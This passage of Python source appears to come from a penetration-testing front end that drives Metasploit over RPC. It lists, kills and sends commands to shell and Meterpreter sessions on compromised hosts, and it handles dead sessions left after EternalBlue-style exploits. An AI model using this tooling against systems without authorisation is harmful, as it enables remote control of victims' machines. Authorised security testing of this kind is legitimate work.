                'exploit_failed':   exploit_failed,
                'check_vulnerable': check_vuln,
                'check_safe':       check_safe,
            }

        except Exception as exc:
            L(f'[ERROR] console run aborted: {exc}')
            return {'status': 'error',
                    'message': str(exc),
                    'result':  '\n'.join(log)}
        finally:
            try:
                console.destroy()
            except Exception:
                pass

    # ── Session management ────────────────────────────────────────────────────

    def list_sessions(self) -> list:
        client = self._client_ref()
        if client is None:
            return []
        try:
            raw = client.sessions.list or {}
            sessions = [
                {
                    'id':       str(sid),
                    'type':     info.get('type', ''),
                    'target':   info.get('target_host', ''),
                    'user':     info.get('username', ''),
                    'platform': info.get('platform', ''),
                    'arch':     info.get('arch', ''),
                    'info':     info.get('info', ''),
                    'tunnel':   info.get('tunnel_local', ''),
                }
                for sid, info in raw.items()
            ]
            # Prefer newest sessions first so UI defaults don't keep landing on
            # stale/older sessions after a fresh exploit run.
            def _sid_key(sess: dict):
                try:
                    return (0, -int(str(sess.get('id', '')).strip()))
                except Exception:
                    return (1, str(sess.get('id', '')))
            sessions.sort(key=_sid_key)
            return sessions
        except Exception:
            return []

    def kill_all_sessions(self) -> dict:
        """
        Stop every registered MSF session. Clears stale tabs in the Shell UI
        without arming adaptive payload fallback (intentional operator action).
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error',
                    'message': 'Not connected to Metasploit RPC',
                    'killed': [], 'failed': [], 'count': 0}

        sessions = self.list_sessions()
        killed, failed = [], []

        for s in sessions:
            sid = str(s.get('id', '')).strip()
            if not sid:
                continue
            try:
                client.sessions.session(sid).stop()
                killed.append(sid)
                with self._session_state_lock:
                    self._session_origin.pop(sid, None)
            except Exception as exc:
                try:
                    if hasattr(client.sessions, 'stop'):
                        client.sessions.stop(sid)
                        killed.append(sid)
                        with self._session_state_lock:
                            self._session_origin.pop(sid, None)
                    else:
                        failed.append({'id': sid, 'message': str(exc)})
                except Exception as exc2:
                    failed.append({'id': sid, 'message': str(exc2)})

        return {
            'status': 'ok',
            'killed': killed,
            'failed': failed,
            'count':  len(killed),
            'message': (f'Killed {len(killed)} session(s)'
                        + (f'; {len(failed)} failed' if failed else '')),
        }

    def session_command(self, session_id: str, command: str) -> dict:
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        try:
            session = client.sessions.session(session_id)
            session.write(command + '\n')
            time.sleep(1.5)
            output = session.read()
            return {'status': 'ok', 'output': output or ''}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    # ── New session API for the dedicated Shell page ─────────────────────────
    # session_command above is kept for back-compat with the Loot tab's modal.
    # The Shell page uses the methods below for:
    #   - non-blocking reads (streaming output via polling)
    #   - type-aware dispatch (shell vs Meterpreter use different MSF APIs)
    #   - explicit writes (for interactive shells where command framing matters)

    def _session_type(self, session_id: str) -> str:
        """Return 'meterpreter', 'shell', or '' if unknown."""
        for s in self.list_sessions():
            if str(s.get('id')) == str(session_id):
                t = (s.get('type') or '').lower()
                if 'meter' in t:
                    return 'meterpreter'
                if t in ('shell', 'powershell'):
                    return t
                return t
        return ''

    def session_read(self, session_id: str) -> dict:
        """
        Non-blocking read of latest buffer. Used by the Shell page to poll
        for streaming output without sending a command.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC',
                    'output': ''}
        try:
            session = client.sessions.session(str(session_id))
            output  = session.read() or ''
            return {'status': 'ok', 'output': output,
                    'session_type': self._session_type(session_id)}
        except Exception as e:
            return {'status': 'error', 'message': str(e), 'output': ''}

    def _classify_session_error(self, exc, session_id: str) -> dict:
        """
        Turn a raw session-operation exception into a clear result. The most
        common one is a dead session: MSF says "Session ID (N) does not exist"
        when the session opened but its host process died (very common with
        kernel-injection exploits). Surface that as a clean, actionable message
        plus a session_dead flag so the Shell tab can drop the dead session
        instead of showing a cryptic raw error.
        """
        msg = str(exc)
        low = msg.lower()
        if ('does not exist' in low or 'unknown session' in low
                or 'session id' in low and 'exist' in low):
            module, rhost, count = self._note_dead_session(session_id)
            extra = ''
            adaptive = _ADAPTIVE_STAGELESS_PAYLOADS.get(module or '')
            if adaptive and rhost:
                extra = (f' Next blank-payload run against {rhost} will use '
                         f'{adaptive} with escalated auto-migrate '
                         f'(dead sessions seen: {count}). Re-launch the exploit '
                         f'— do not reuse this session tab.')
            return {
                'status': 'error',
                'session_dead': True,
                'message': (f'Session {session_id} has died — the target '
                            f'process likely terminated. This is common with '
                            f'kernel-injection exploits (EternalBlue). Kill stale '
                            f'sessions, reboot the target if needed, clear the '
                            f'payload field, and re-launch with auto-migrate ON.'
                            f'{extra}'),
            }
        return {'status': 'error', 'message': msg}

    def session_write(self, session_id: str, data: str) -> dict:
        """
        Raw write to a session. For shells this is how to send input —
        Meterpreter prefers session_meterpreter_run for proper response capture.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        try:
            session = client.sessions.session(str(session_id))
            session.write(data)
            return {'status': 'ok'}
        except Exception as e:
            return self._classify_session_error(e, session_id)

    def session_meterpreter_run(self, session_id: str, command: str,
                                  timeout: int = 15) -> dict:
        """
        Run a Meterpreter command via run_with_output when available, falling
        back to write+read+wait. run_with_output is more reliable because it
        knows when the command has finished — write+read can return mid-output.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        try:
            session = client.sessions.session(str(session_id))
            if hasattr(session, 'run_with_output'):
                output = session.run_with_output(command, timeout=timeout) or ''
                return {'status': 'ok', 'output': output}
            # Fallback: write command, wait, accumulate reads
            session.write(command + '\n')
            output = ''
            for _ in range(timeout * 2):
                time.sleep(0.5)
                chunk = session.read() or ''
                output += chunk
                if not chunk:
                    break
            return {'status': 'ok', 'output': output}
        except Exception as e:
            return self._classify_session_error(e, session_id)

    def session_run(self, session_id: str, command: str,
                     timeout: int = 15) -> dict:
        """
        Type-dispatched session runner — the right MSF API per session type.
        This is what the Shell page calls for every command send.

        Meterpreter → meterpreter_run (synchronous, captures full output)
        Shell       → write + read (raw command framing)
        """
        stype = self._session_type(session_id)
        if stype == 'meterpreter':
            result = self.session_meterpreter_run(session_id, command, timeout)
        else:
            # Raw shell / powershell — write the line, give it a beat, read back
            client = self._client_ref()
            if client is None:
                return {'status': 'error',
                        'message': 'Not connected to Metasploit RPC'}
            try:
                session = client.sessions.session(str(session_id))
                session.write(command + '\n')
                # Brief wait, then accumulate reads until silence
                output = ''
                deadline = time.time() + timeout
                silent_reads = 0
                while time.time() < deadline:
                    time.sleep(0.4)
                    chunk = session.read() or ''
                    if chunk:
                        output += chunk
                        silent_reads = 0
                    else:
                        silent_reads += 1
                        if silent_reads >= 3:    # 1.2s of silence = done
                            break
                result = {'status': 'ok', 'output': output}
            except Exception as e:
                result = self._classify_session_error(e, session_id)
        result['session_type'] = stype
        return result
